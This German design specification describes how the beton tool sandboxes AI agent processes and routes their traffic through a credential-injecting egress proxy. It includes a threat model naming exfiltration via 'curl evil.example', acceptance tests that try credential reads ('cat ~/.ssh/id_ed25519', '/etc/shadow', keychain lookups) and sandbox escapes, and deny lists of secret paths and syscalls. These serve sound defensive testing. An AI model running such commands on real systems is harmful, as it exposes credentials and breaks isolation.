# 04 — Sandbox & Egress-/Credential-Proxy

Dieses Kapitel spezifiziert die Isolation von Agent-Ausführung in beton: das **Sandbox-Provider-Interface** (`beton-sandbox`) mit den Backends Seatbelt (macOS), Landlock + seccomp + Namespaces (Linux), Windows (Beta) und Docker/Podman, das **zweistufige Modell** (Stufe 1 = Harness-Prozess, Stufe 2 = Tool-Ausführung) sowie den **Egress-/Credential-Proxy** (`beton-proxy`), über den jeglicher Netzwerkverkehr aus der Sandbox läuft. Ziel ist, dass Agents unbeaufsichtigt („YOLO-Mode“) laufen können, ohne dass Prompt-Injection, bösartige Repos oder kompromittierte Dependencies an Secrets, fremde Dateien oder beliebige Netzziele kommen.

Grundlage ist ADR-0007 (Sandbox), ergänzt durch ADR-0003 (Prozessmodell: Runner kapselt Harness), ADR-0024 (Secrets: Platzhalter `bt_cred_*`) und ADR-0011 (Auth). Policies, die Sandbox-Einstellungen erzwingen oder Browser-Aktionen regeln, stehen in POL (siehe 03-policies.md); Secret-Speicherung und Audit in SEC (siehe 05-security-identity.md); Events in PROTO-002 (siehe 06-data-sync-protocol.md). Meilensteine: macOS/Linux und Proxy in **M2**, PTY-Modus unter Sandbox in **M3**, Docker/Podman-Backend und Windows-Beta in **M5**.

## Konzepte & Begriffe

| Begriff | Bedeutung |
| --- | --- |
| **Sandbox-Provider** | Implementierung des Traits `SandboxProvider` für ein Isolations-Backend (`seatbelt`, `landlock`, `bwrap`, `windows`, `docker`, `podman`). |
| **Stufe 0** | beton-eigene Prozesse ohne Sandbox: Runner, Exec-Broker, Proxy, PTY-Multiplexer, eingebaute MCP-System-Tools, Direkt-API-Agent-Loop. Vertrauenswürdig. |
| **Stufe 1 (Harness)** | Sandbox um den Vendor-Harness-Prozess (`claude`, `codex`, ACP-Agent). Darf die **eigenen** Credential-Dateien/Keychain-Einträge des Vendors lesen und Vendor-API-Hosts erreichen. |
| **Stufe 2 (Tools)** | Strengere Sandbox für jede Tool-Ausführung (Bash, Skripte, Build-Tools, MCP-stdio-Server). Kein Zugriff auf Vendor-Credentials, Keychain oder Desktop-Session-Busse. |
| **Exec-Broker** | Stufe-0-Dienst im Runner, der Kommandoanfragen aus Stufe 1 entgegennimmt und sie in einer frischen Stufe-2-Sandbox startet (vermeidet verschachtelte Sandboxes). |
| **`bt-exec`** | Kleiner Shim (Modus `beton __exec`), der in Stufe 1 als Shell-Ersatz bzw. Shell-Präfix dient und Kommandos an den Exec-Broker übergibt. |
| **SandboxSpec** | Deklarative Konfiguration (YAML) einer Sandbox; wird zu einer **ResolvedPolicy** (absolute, kanonische Pfade, konkrete Regeln) aufgelöst. |
| **Maske** | Pfad, der innerhalb einer freigegebenen Wurzel unsichtbar gemacht wird (Verzeichnis → leer, Datei → leer/nicht lesbar). |
| **Scratch** | Privates, beschreibbares Temp-Verzeichnis pro Session und Stufe (`TMPDIR`). |
| **Capability** | Eine vom Backend erzwingbare Eigenschaft (`fs_read`, `fs_write`, `net`, `env`, `proc`, `syscall`, `masks`). |
| **Degraded** | Zustand, in dem eine Capability nicht erzwungen wird; nur mit ausdrücklichem Opt-out zulässig und in Events/UI sichtbar. |
| **Egress-Proxy** | Rust-Proxy (`beton-proxy`), der HTTP(S) aus der Sandbox gegen Regeln prüft (Default-Deny), TLS terminiert (MITM) und Credentials injiziert. |
| **Egress-Regel** | Zeichenkette `"METHODS host/path-glob"`, z. B. `"GET,HEAD registry.npmjs.org/**"`. |
| **Passthrough** | CONNECT-Tunnel **ohne** TLS-Terminierung, nur Host-Prüfung; für Vendor-API-Hosts in Stufe 1, damit beton Subscription-Tokens nie sieht. |
| **Platzhalter** | `bt_cred_<32 Zeichen base32>`; steht im Sandbox-Environment statt eines echten Secrets; nur der Proxy kennt die Zuordnung. |
| **Credential-Binding** | Zuordnung Platzhalter → Secret-Quelle + erlaubte Hosts + Injektionsformat (`bearer`, `basic`, `git_https`, `github`, `gitlab`). |
| **beton-CA** | Pro Installation erzeugte Root-CA des Proxys; nie im System-Trust-Store, nur per Env in die Sandbox gereicht. |

## Design

### Zweistufiges Modell — Rechte-Matrix

| Ressource | Stufe 0 (Runner/Proxy/Broker) | Stufe 1 (Harness-Prozess) | Stufe 2 (Tool-Ausführung) |
| --- | --- | --- | --- |
| Workspace/Worktree lesen | ja | ja | ja |
| Workspace schreiben | ja | ja (Edit-Tools des Harness) | ja bei `workspace: rw` (Default), sonst nein |
| `<repo>/.git/hooks`, `.git/config` | ja | nur lesen | nur lesen |
| Eigene Vendor-Credential-Dateien (z. B. `~/.claude/.credentials.json`, `~/.codex/auth.json`) | technisch ja, **beton liest sie nie** | ja, **nur** die vom Adapter deklarierten Pfade | **nein** (maskiert) |
| Vendor-State-Dirs (`~/.claude/projects`, `~/.codex/sessions` …) | lesen (Import, HAR-023/HAR-024, SES-008) | lesen/schreiben | nein |
| OS-Keychain / Secret Service (D-Bus) | ja (`beton-secrets`) | nur wenn Adapter `keychain: true` deklariert | **nein** |
| `~/.ssh`, `~/.aws`, `~/.config/gh`, `~/.netrc`, `~/.docker`, `~/.kube`, `~/.gnupg`, `~/.beton` | `~/.beton` ja | nein | nein |
| SSH-Agent-Socket, Docker-Socket | ja (Docker-Socket nur für Docker-Backend) | nein | nein |
| beton-API-Token (`~/.beton/auth/*`) | ja | nein; nur session-gebundenes MCP-Token | nein |
| Netzwerk | frei (Proxy-Upstream) | **nur zum Proxy**; Vendor-Hosts als Passthrough, sonst Regeln | **nur zum Proxy**, `egress_rules`, MITM |
| Environment | voll | Basis + Harness-Familie + `passthrough` | Basis + `passthrough` + Platzhalter |
| Andere Prozesse des Users (Signale, ptrace) | ja | nein | nein |
| `/tmp` | System | privater Scratch | privater Scratch |

Wie Stufe-2-Ausführung erzwungen wird, deklariert jeder Harness-Adapter als `tool_isolation` (Capabilities, HAR-002 in 01-harnesses.md):
- **Direkt-API-Harness, ACP** (`terminal/*`, `fs/*` laufen über beton als Client): beton führt Tools selbst aus → immer Stufe 2.
- **Claude Code nativ/PTY:** Bash-Tool via Shell-Präfix `bt-exec` *(Annahme: `CLAUDE_CODE_SHELL_PREFIX` bzw. Shell-Override bleibt verfügbar)*.
- **Codex nativ/PTY:** Shell-Override bzw. `bt-exec` als `bash`/`sh`-Shim vorn im `PATH` der Stufe 1 *(Annahme, pro Codex-Release zu verifizieren)*.
- Kann ein Adapter Stufe 2 nicht erzwingen (`tool_isolation: inherited`), startet die Session nur mit `sandbox.require_tool_isolation: false` und ist als *degraded* markiert.

```
 Stufe 1 (Sandbox)                       Stufe 0 (Runner)                 Stufe 2 (frische Sandbox)
 claude ──Bash("npm test")──► bt-exec ──unix──► Exec-Broker ──spawn(policy_T)──► sh -c "npm test"
                                  ▲      argv, cwd, env-diff,     │  stdio-FDs (SCM_RIGHTS)       │
                                  └────── exit code, signals ◄────┴───────────────────────────────┘
```

### Sandbox-Provider-Trait (Skizze, `beton-sandbox`)

```rust
pub trait SandboxProvider: Send + Sync {
    fn id(&self) -> ProviderId;                       // seatbelt | landlock | bwrap | windows | docker | podman
    fn probe(&self) -> ProbeReport;                   // erkannte Capabilities + Gründe für fehlende
    fn resolve(&self, spec: &SandboxSpec, ctx: &ResolveCtx)
        -> Result<ResolvedPolicy, SandboxError>;      // Pfade kanonisieren, Masken expandieren, Pflicht-Caps prüfen
    fn spawn(&self, policy: &ResolvedPolicy, cmd: CommandSpec)
        -> Result<SandboxedChild, SandboxError>;      // startet Prozess(baum) isoliert
}

pub struct ProbeReport { pub caps: CapSet, pub details: BTreeMap<Cap, CapDetail>, pub version: String }
pub enum Cap { FsRead, FsWrite, Masks, Net, Env, Proc, Syscall, Resources }
pub struct ResolvedPolicy {
    pub stage: Stage,                    // Harness | Tools
    pub read_roots: Vec<CanonPath>, pub write_roots: Vec<CanonPath>, pub masks: Vec<Mask>,
    pub env: BTreeMap<String, String>,   // vollständiges, explizites Env (kein Erben)
    pub net: NetMode,                    // None | ProxyOnly { endpoint, auth_token }
    pub limits: Limits, pub required: CapSet, pub degraded: CapSet,
}
pub trait SandboxedChild { fn pid(&self) -> u32; async fn wait(&mut self) -> ExitStatus; fn kill_tree(&mut self); }
```

`SandboxError` ist strukturiert (`Unavailable { provider, missing: CapSet, hint }`, `InvalidSpec`, `PathEscape`, `SpawnFailed`) und wird als RFC-9457-Problem `sandbox_unavailable` ausgeliefert (PROTO-011, siehe 06-data-sync-protocol.md).

### Sandbox-Konfiguration (YAML)

Ort: Agent-YAML (`sandbox:`), Projekt `.beton/config.yaml`, User `~/.beton/config.yaml`. Auflösung: Agent > Projekt > User > eingebauter Default; Listen (`masks`, `env.deny`) werden vereinigt, Grants (`read_paths`, `write_paths`, `egress_rules`) kommen von der spezifischsten Ebene. Policies dürfen Sandbox-Werte nur verschärfen (AGT-014, POL-007; siehe 02-agents.md, 03-policies.md).

```yaml
sandbox:
  backend: auto              # auto | seatbelt | landlock | bwrap | windows | docker | podman | none
  preset: default            # default | dev | readonly  (SBX-012)
  require_tool_isolation: true
  workspace: rw              # rw | ro
  read_paths: [~/.cargo/registry, /opt/homebrew]
  write_paths: [~/.cache/sccache]
  masks: [.env, .env.*, secrets/]          # zusätzlich zu den Default-Masken (SBX-004)
  allow_hidden: [.venv, .cargo, .github]   # Dotfiles in Grants, die NICHT maskiert werden
  env:
    passthrough: [RUST_LOG, NODE_OPTIONS]  # Namen oder Präfixe mit *, z. B. "LC_*"
    set: { CI: "1" }
  allow_network: true        # false = gar kein Netz; true = nur über Proxy gemäß egress_rules
  egress_rules:
    - "GET,HEAD registry.npmjs.org/**"
    - "GET,HEAD static.crates.io/** index.crates.io/**"
    - "* api.github.com/repos/ifahrentholz/**"
    - "!DELETE api.github.com/**"
  egress_allow_private: []   # z. B. ["127.0.0.1:5432"]; Default: private Ziele gesperrt
  credentials:               # siehe PRX-006
    - { name: github, type: github, source: { secret: "secret://user/github.com/ifahrentholz" }, env: [GH_TOKEN] }
  limits: { memory_mb: 8192, pids: 1024, cpu_seconds: null }
  harness:                   # Stufe-1-Overrides (selten nötig)
    egress_extra: ["* mcp.example.com/**"]
  windows:
    allow_unenforced_network: false        # SBX-016
```

### Fail-closed-Auflösung

```
SandboxSpec ──► backend wählen (auto: macOS→seatbelt, Linux→landlock|bwrap, Windows→windows)
            ──► probe(): fehlt eine Capability aus required? ── ja ──► Fehler sandbox_unavailable
            │                                                          (kein Fallback auf unsandboxed)
            └─► resolve(): Pfade kanonisieren (realpath), Symlinks/Hardlinks prüfen, Masken expandieren
            ──► Proxy-Instanz + Credential-Bindings anlegen ──► spawn() ──► Event sandbox.started
```

### Bedrohungsmodell

**Angreifer:** (A1) Prompt-injizierter Agent, der Tools mit bösartigen Argumenten aufruft; (A2) bösartiger Repo-Inhalt (Build-Skripte, Git-Hooks, `package.json`-Scripts); (A3) kompromittierte Dependency, die während `npm install`/`cargo build` Code ausführt; (A4) Netzwerk-Gegenstelle, die DNS-Rebinding oder Redirects auf interne Ziele nutzt.
**Schutzgüter:** Vendor-Subscription-Tokens, Secrets (Git-Tokens, API-Keys), SSH-/Cloud-Credentials, Dateien außerhalb des Workspace, lokale Dienste und Cloud-Metadaten-Endpunkte, Integrität des Host-Systems (Shell-RC-Dateien, LaunchAgents, Git-Hooks).

| Bedrohung | Gegenmaßnahme | Feature |
| --- | --- | --- |
| Lesen von `~/.ssh`, `~/.aws`, Vendor-Tokens aus einem Tool | Deny-default-FS, Default-Masken, Stufentrennung | SBX-002, SBX-004 |
| Exfiltration per `curl evil.example` | Netz nur zum Proxy, Default-Deny-Regeln | SBX-007/008, PRX-001, PRX-003 |
| Zugriff auf `169.254.169.254`, `localhost:5432`, LAN | Private-IP-Sperre nach DNS-Auflösung, Pinning der geprüften IP | PRX-007 |
| Secret-Diebstahl über Env oder Transkript | Env deny-by-default, nur Platzhalter, Redaction | SBX-005, PRX-006, SEC-013 |
| Platzhalter an fremden Host senden | Host-Bindung; Fehlgebrauch → 403 + Audit | PRX-006 |
| Persistenz außerhalb des Workspace (`~/.zshrc`, LaunchAgents, `.git/hooks`) | Schreib-Grants nur Workspace/Scratch, `.git/hooks` read-only | SBX-003, SBX-004 |
| Ausbruch über Symlink/Hardlink im Workspace | `realpath` bei Auflösung, Kernel-Durchsetzung auf Inode-Ebene (Landlock/Seatbelt), Hardlink-Prüfung von Credential-Quellen | SBX-003, PRX-006 |
| Sandbox stillschweigend nicht aktiv | Fail-closed, Event `sandbox.started` mit Capabilities | SBX-006 |
| Prozesse überleben die Session | Prozessbaum-Kontrolle, PID-Namespace/Job Object | SBX-013 |

**Nicht-Ziele / Restrisiken:** Kernel-Exploits und Seitenkanäle; ein bösartiges Vendor-CLI selbst (Stufe 1 ist dem Vendor so weit vertraut wie dessen eigene Credentials); auf macOS ist Keychain-Zugriff in Stufe 1 nicht auf einzelne Einträge einschränkbar (Schutz nur durch Keychain-ACLs); manipulierte Workspace-Dateien, die der User später außerhalb der Sandbox ausführt; Windows-Beta-Lücken (SBX-016).

## Features

### SBX-001 — Sandbox-Provider-Trait & Registry
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** `beton-sandbox` definiert `SandboxProvider` (probe/resolve/spawn) und eine Registry, die Backends pro Plattform registriert. Alle Prozessstarts von Harness- und Tool-Prozessen laufen ausschließlich über diese Schnittstelle; ein direkter `std::process::Command`-Spawn von Agent-Code außerhalb von `beton-sandbox` ist verboten. `backend: none` ist ein eigener Provider, der explizit gewählt werden muss.
- **Details:** Ein Clippy-Lint bzw. `cargo deny`-artiger Check (`disallowed-methods` für `Command::spawn` außerhalb `beton-sandbox`/`beton-pty`) sichert die Regel ab.
- **Akzeptanzkriterien:**
  - [ ] AC1 — `beton sandbox probe --json` listet alle registrierten Provider mit `caps` und je fehlender Capability einen Grund.
  - [ ] AC2 — Ein CI-Lint schlägt fehl, wenn außerhalb von `beton-sandbox`/`beton-pty` `Command::spawn` für Harness/Tools verwendet wird.
  - [ ] AC3 — `backend: auto` wählt auf macOS `seatbelt`, auf Linux `landlock` (bzw. `bwrap` gemäß SBX-009); eine unbekannte Backend-ID führt zu `InvalidSpec` beim Laden der Konfiguration.
  - [ ] AC4 — Jeder erfolgreiche Spawn erzeugt genau ein Event `sandbox.started {stage, backend, caps, degraded}`.
- **Abhängigkeiten:** PROTO-002, PROTO-011 (siehe 06-data-sync-protocol.md)
- **Referenz:** ADR-0007; Omnigent `SandboxBackend` (3.5.3)

### SBX-002 — Zweistufiges Modell & Exec-Broker
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Harness-Prozesse laufen in Stufe 1, jede Tool-Ausführung in einer frischen Stufe-2-Sandbox, gestartet vom Exec-Broker in Stufe 0. Das vermeidet verschachtelte Sandboxes (Seatbelt kann nicht verschachtelt werden) und stellt sicher, dass Tools die Credential-Grants der Stufe 1 nicht erben. Adapter deklarieren ihre Credential-Pfade (`credential_paths`), Keychain-Bedarf (`keychain`), Env-Familien und Passthrough-Hosts; nur diese erhält Stufe 1.
- **Details:** Broker-Protokoll über Unix-Socket (Windows: Named Pipe mit ACL auf den Session-SID) im Scratch der Stufe 1: Request `{argv, cwd, env_overrides, tty, cols, rows}`, Antworten `started{pid}`/`exited{code, signal}`; stdio als FD-Übergabe (`SCM_RIGHTS`) bzw. PTY vom Broker. `cwd` und `env_overrides` werden gegen die Stufe-2-Policy validiert (cwd muss in Read-Roots liegen; Overrides dürfen nur nicht-gesperrte Variablen setzen). Pro Session ein Broker-Token; Anfragen ohne Token werden abgelehnt.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Given Claude Code in Stufe 1, when das Bash-Tool `cat ~/.claude/.credentials.json` ausführt, then scheitert der Befehl (Permission denied/No such file), während der Harness selbst authentifiziert bleibt.
  - [ ] AC2 — Ein Kommando über `bt-exec` läuft nachweislich in einer Stufe-2-Sandbox (Probe meldet `stage=tools`, Keychain-Mach-Lookup bzw. D-Bus-Zugriff scheitert).
  - [ ] AC3 — Ein Broker-Request mit `cwd=/etc` oder `env_overrides={"LD_PRELOAD": …}` wird mit Fehler abgelehnt.
  - [ ] AC4 — Ein Adapter mit `tool_isolation: inherited` startet nur, wenn `require_tool_isolation: false` gesetzt ist; sonst `sandbox_unavailable` mit Hinweis.
  - [ ] AC5 — Exit-Code und Signale (SIGINT bei Interrupt) werden korrekt zwischen `bt-exec` und Stufe-2-Prozess durchgereicht (Test mit `sh -c 'exit 7'` und `sleep 60` + Interrupt).
- **Abhängigkeiten:** SBX-001, HAR-002, HAR-004, HAR-006, HAR-007 (siehe 01-harnesses.md)
- **Referenz:** ADR-0007 (zweistufig)

### SBX-003 — Sandbox-Konfiguration & Pfadauflösung
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Die YAML-Konfiguration (siehe Design) wird mit JSON-Schema validiert, über Ebenen gemergt und zu einer `ResolvedPolicy` aufgelöst. Pfade werden nur mit `~` expandiert (keine `$VAR`-Expansion), kanonisiert und gegen verbotene Wurzeln geprüft. Der Workspace (bzw. Worktree inkl. `<repo>/.git/worktrees/<name>` und Objekt-DB) ist implizit Read-/Write-Root.
- **Details:** Verbotene Grants (Fehler, nicht still ignoriert): `/`, `~` als `write_paths`, `~/.beton`, `~/.ssh`, das Docker-Socket, Pfade unter `/proc`, `/sys`. `read_paths: ["~"]` ist erlaubt, unterliegt aber den Default-Masken. Symlinks in Grants werden aufgelöst; zeigt das Ziel in eine verbotene Wurzel → Fehler `PathEscape`.
- **Akzeptanzkriterien:**
  - [ ] AC1 — `write_paths: ["~"]` wird beim Laden mit `InvalidSpec` und Pfadangabe abgelehnt.
  - [ ] AC2 — `read_paths: ["~/link"]` mit `~/link → ~/.ssh` liefert `PathEscape`.
  - [ ] AC3 — `read_paths: ["$HOME/x"]` wird nicht expandiert und als relativer Pfad abgelehnt.
  - [ ] AC4 — Ein Tool kann in `<repo>/.git/hooks/pre-commit` nicht schreiben, wohl aber Commits erzeugen (`git commit` im Worktree gelingt).
  - [ ] AC5 — `beton sandbox explain` gibt die aufgelöste Policy (Roots, Masken, Env-Namen ohne Werte, Regeln) aus.
- **Abhängigkeiten:** SBX-001, SES-015 (siehe 07-sessions-collaboration.md)

### SBX-004 — Default-Masken für Dotfiles & Credential-Pfade
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Innerhalb freigegebener Wurzeln werden Credential- und Konfigurationsdateien maskiert, damit z. B. `read_paths: ["~"]` nicht `~/.ssh` exponiert. Dotfiles direkt in Grants werden standardmäßig maskiert, außer sie stehen in `allow_hidden`. Im Workspace selbst bleiben Dotfiles sichtbar (`.github`, `.gitignore` …), außer den Mustern aus `masks` (Default `.env`, `.env.*`).
- **Details:** Default-Masken (Stufe 1 und 2): `~/.ssh`, `~/.aws`, `~/.azure`, `~/.config/gcloud`, `~/.config/gh`, `~/.config/glab-cli`, `~/.netrc`, `~/.git-credentials`, `~/.docker/config.json`, `~/.kube`, `~/.gnupg`, `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials*`, `~/.beton`, `~/Library/Keychains` (macOS), `$XDG_RUNTIME_DIR`. Zusätzlich in Stufe 2: alle `credential_paths` und State-Dirs aller Adapter. Linux: Masken über Mount-Namespace (tmpfs bzw. Bind von `/dev/null`); ohne Mount-NS Grant-Expansion (Geschwister einzeln freigeben). macOS: SBPL-Deny-Regeln nach den Allow-Regeln.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Mit `read_paths: ["~"]` scheitert `cat ~/.ssh/id_ed25519` (Fixture) in Stufe 1 und 2; `ls ~/Documents` gelingt.
  - [ ] AC2 — `cat .env` im Workspace scheitert bei Default-Konfiguration; mit `masks: []` *und* `allow_hidden: [.env]` gelingt es.
  - [ ] AC3 — In Stufe 2 ist `~/.codex/auth.json` nicht lesbar, in Stufe 1 einer Codex-Session schon.
  - [ ] AC4 — Eine Maske ist nicht durch Umbenennen/Hardlink des Elternverzeichnisses aus der Sandbox heraus umgehbar (Escape-Test).
- **Abhängigkeiten:** SBX-003

### SBX-005 — Environment deny-by-default
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Sandbox-Prozesse erben kein Environment. beton baut es explizit: Basis (`PATH`, `HOME`, `USER`, `LOGNAME`, `SHELL`, `TERM`, `LANG`, `LC_*`, `TZ`, `TMPDIR`=Scratch), Proxy- und CA-Variablen (PRX-008), Session-Marker (`BETON_SESSION_ID`, `BETON_STAGE`), in Stufe 1 die Harness-Familie des Adapters (z. B. `ANTHROPIC_*`, `CLAUDE_*` bzw. `OPENAI_*`, `CODEX_HOME`), plus `env.passthrough` und `env.set`. Platzhalter-Variablen kommen aus `credentials[].env`.
- **Details:** Immer entfernt, auch bei Passthrough: `SSH_AUTH_SOCK`, `DBUS_SESSION_BUS_ADDRESS` (Stufe 2; Stufe 1 nur bei `keychain: true`), `XDG_RUNTIME_DIR` (ersetzt durch Scratch), `BETON_TOKEN`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*`. Werte werden nie über argv übergeben (sichtbar in `/proc/*/cmdline`), sondern per Env des Kindprozesses bzw. FD.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Given `AWS_SECRET_ACCESS_KEY=x` im Daemon-Env, then ist die Variable in Stufe 1 und 2 nicht gesetzt (`env` im Tool).
  - [ ] AC2 — `env.passthrough: ["SSH_AUTH_SOCK"]` wird mit Konfigurationsfehler abgelehnt.
  - [ ] AC3 — `GH_TOKEN` in Stufe 2 hat einen Wert mit Präfix `bt_cred_` und nie den echten Token.
  - [ ] AC4 — `/proc/<pid>/cmdline` des Sandbox-Launchers enthält keine Secret-Werte oder Proxy-Tokens (Linux-Test).
- **Abhängigkeiten:** SBX-003, PRX-006

### SBX-006 — Fail-closed: verlangt, aber nicht verfügbar → Fehler
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Fehlt eine geforderte Capability, startet die Session nicht; es gibt keinen stillen Fallback auf unsandboxed oder schwächere Backends. Default ist „Sandbox erforderlich“ für alle Harness-Sessions. Unsandboxed geht nur mit `backend: none`, das in UI/CLI einmal pro Session bestätigt werden muss und per Policy verboten werden kann. YOLO-Mode (`permission_mode: yolo`: keine Vendor-Rückfragen, beton-Policies gelten weiter; HAR-027 in 01-harnesses.md) ist ohne aktive Sandbox nicht startbar.
- **Details:** Fehler-Problem: `{code: "sandbox_unavailable", provider, missing: ["net"], hint: "Kernel ≥ 5.19 mit Landlock oder backend: docker"}`. Verliert eine laufende Session ihre Sandbox-Voraussetzung (z. B. Proxy-Absturz), werden neue Tool-Ausführungen abgelehnt und die Session pausiert.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Given Linux ohne Landlock und ohne bwrap, when `beton run claude` mit Default-Config, then Exit-Code ≠ 0 mit `sandbox_unavailable` und es wurde kein Harness-Prozess gestartet.
  - [ ] AC2 — `permission_mode: yolo` zusammen mit `backend: none` wird beim Session-Start abgelehnt.
  - [ ] AC3 — Wird der Proxy-Prozess während einer Session beendet, scheitert der nächste Netzwerkzugriff aus Stufe 2 (kein Direktzugriff), und die Session geht in `paused` mit Event `sandbox.violation {kind: "proxy_down"}`.
  - [ ] AC4 — Eine Org-/User-Policy `sandbox.backend != "none"` verhindert `backend: none` auch bei expliziter Bestätigung.
- **Abhängigkeiten:** SBX-001, PRX-001, POL-024 (siehe 03-policies.md), HAR-027 (siehe 01-harnesses.md)
- **Referenz:** ADR-0007; Omnigent „Fehler statt unsandboxed“

### SBX-007 — macOS-Backend: Seatbelt (SBPL, deny-default)
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Prozesse werden über `/usr/bin/sandbox-exec -f <profil>` gestartet. Das Profil wird pro Spawn aus einem versionierten Template generiert: `(version 1) (deny default)`, minimale System-Lese-Pfade, Prozess-/Signal-Rechte nur auf den eigenen Baum, Read/Write-Roots, Masken als nachgestellte Deny-Regeln, Netzwerk ausschließlich `localhost:<proxy-port>`. Pfade gehen als Profil-Parameter (`-D KEY=VALUE`) ein, nie per String-Konkatenation ins SBPL.
- **Details:** Stufe 1 mit `keychain: true` erhält die für Keychain-Zugriff nötigen Mach-Services (`com.apple.SecurityServer`, `com.apple.securityd*`); Stufe 2 nie. `~/Library` ist außer explizit freigegebenen Unterpfaden gesperrt. DNS-Dienst (`com.apple.dnssd.service`, mDNSResponder) ist gesperrt — Namensauflösung erfolgt im Proxy. Profil-Datei 0600 im Scratch, max. 256 KiB. Da `sandbox-exec` von Apple als deprecated markiert ist, prüft `beton doctor` die Funktionsfähigkeit bei jedem macOS-Update (Escape-Suite in CI auf aktuellen macOS-Versionen).
- **Akzeptanzkriterien:**
  - [ ] AC1 — In Stufe 2 scheitert `security find-generic-password -s "Claude Code-credentials"`; in Stufe 1 (Claude-Adapter) funktioniert die Authentifizierung des CLIs.
  - [ ] AC2 — `curl https://example.com` ohne Proxy-Env (`env -u HTTPS_PROXY`) scheitert mit Verbindungsfehler; mit Proxy und passender Regel gelingt es.
  - [ ] AC3 — Ein Workspace-Pfad mit `"`, `)` oder Zeilenumbruch im Namen erzeugt ein gültiges, nicht manipulierbares Profil (Fuzz-Test des Profil-Generators).
  - [ ] AC4 — Schreiben nach `~/Library/LaunchAgents/x.plist` und `~/.zshrc` scheitert in beiden Stufen.
  - [ ] AC5 — Verbindung zu einem auf `127.0.0.1:<anderer Port>` lauschenden Host-Dienst scheitert.
- **Abhängigkeiten:** SBX-001, SBX-004, PRX-008
- **Referenz:** Omnigent `seatbelt_sandbox.py` (3.5.3)

### SBX-008 — Linux-Backend: Landlock + seccomp + Namespaces
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Nativ in Rust (Crates `landlock`, `seccompiler`/libseccomp, `nix`), ohne externes Binary. Der Launcher (`beton __sandbox-exec`) erzeugt unprivilegiert User-, Mount-, PID-, Net-, IPC- und UTS-Namespaces, richtet Masken und privates `/tmp` ein, startet im Net-NS einen Relay (`127.0.0.1:<R>` → Unix-Socket des Proxys), setzt `PR_SET_NO_NEW_PRIVS`, wendet Landlock-Regeln an, lädt den seccomp-Filter und führt das Ziel als Kind von PID 1 (Reaper) aus. `PR_SET_PDEATHSIG` beendet alles mit dem Runner.
- **Details:** seccomp-Denylist (EPERM): `mount`/`umount2`/`pivot_root`/`chroot`/neue Mount-API, `unshare`, `setns`, `ptrace`, `process_vm_readv/writev`, `bpf`, `perf_event_open`, `userfaultfd`, `kexec*`, `init_module`/`finit_module`/`delete_module`, `keyctl`/`add_key`/`request_key`, `io_uring_*`, `open_by_handle_at`, `reboot`, `swapon/off`, Uhr-Setzen; `socket` nur `AF_UNIX`/`AF_INET`/`AF_INET6`; `clone` mit `CLONE_NEW*` → EPERM, `clone3` → ENOSYS; inkl. Compat-ABIs. Kernel-Anforderungen und Fallback:

| Bedingung | Verhalten |
| --- | --- |
| Landlock nicht aktiv (Kernel < 5.13 oder fehlt in `lsm=`) bzw. ABI 1 (5.13–5.18) | Backend nicht verfügbar → SBX-009 (bwrap) oder Fehler |
| ABI 2 (Kernel 5.19–6.1) | unterstützt; `truncate(2)` zusätzlich per seccomp gesperrt (Truncate-Kontrolle fehlt) |
| ABI ≥ 3 (≥ 6.2) | voll unterstützt (Mindestempfehlung) |
| ABI ≥ 4 (≥ 6.7) | zusätzlich Landlock-TCP-Regeln als Defense-in-Depth: `connect` nur zum Relay-Port, kein `bind` |
| ABI ≥ 6 (≥ 6.12) | zusätzlich Scoping für Signale und abstrakte Unix-Sockets |
| Unprivilegierte User-NS gesperrt (`unprivileged_userns_clone=0`, `max_user_namespaces=0`, AppArmor-Restriktion) | Netz- und Masken-Isolation nicht möglich → SBX-009 (bwrap) oder Fehler; deb/rpm-Pakete liefern ein AppArmor-Profil für `/usr/bin/beton` mit `userns`-Recht |
| seccomp-Filter nicht verfügbar | Fehler |

- **Akzeptanzkriterien:**
  - [ ] AC1 — Auf Kernel ≥ 6.2: `cat /etc/shadow`, `echo x > /etc/beton-test`, `cat ~/.ssh/id_ed25519` scheitern in Stufe 2; Schreiben im Workspace gelingt.
  - [ ] AC2 — In Stufe 2 scheitert jede TCP-/UDP-Verbindung außer zum Relay (z. B. `nc 1.1.1.1 53`, `curl --noproxy '*' https://example.com`); der Net-NS enthält nur `lo`.
  - [ ] AC3 — `unshare -r`, `mount -t tmpfs`, `strace -p <runner-pid>` und `kill -9 <runner-pid>` scheitern aus der Sandbox.
  - [ ] AC4 — Auf Debian 12 (Kernel 6.1, ABI 2) läuft die Sandbox, und `truncate -s0 <read-only-Datei>` scheitert.
  - [ ] AC5 — Auf Ubuntu 24.04 mit AppArmor-Userns-Restriktion und installiertem Paketprofil funktioniert das Backend; ohne Profil meldet `beton sandbox probe` den Grund und den Fallback.
  - [ ] AC6 — Nach Beenden des Runners (SIGKILL) existiert binnen 1 s kein Prozess der Sandbox mehr.
- **Abhängigkeiten:** SBX-001, SBX-004, PRX-008
- **Referenz:** ADR-0007; Omnigent bwrap/seccomp (3.5.3), dort ohne Landlock

### SBX-009 — Linux-Fallback: bubblewrap
- **Meilenstein:** M2 · **Priorität:** Should
- **Beschreibung:** Sind unprivilegierte User-Namespaces nicht verfügbar, aber ein (setuid- oder per AppArmor erlaubtes) `bwrap` ≥ 0.8 installiert, nutzt beton bwrap für Namespaces und Mounts und wendet Landlock und seccomp danach im eigenen Launcher innerhalb von bwrap an. Explizit wählbar mit `backend: bwrap`.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Mit `kernel.unprivileged_userns_clone=0` und installiertem bwrap wählt `auto` das Backend `bwrap`, und die Escape-Suite (SBX-011) besteht vollständig.
  - [ ] AC2 — Ein bwrap < 0.8 wird als „nicht verfügbar“ mit Versionshinweis gemeldet.
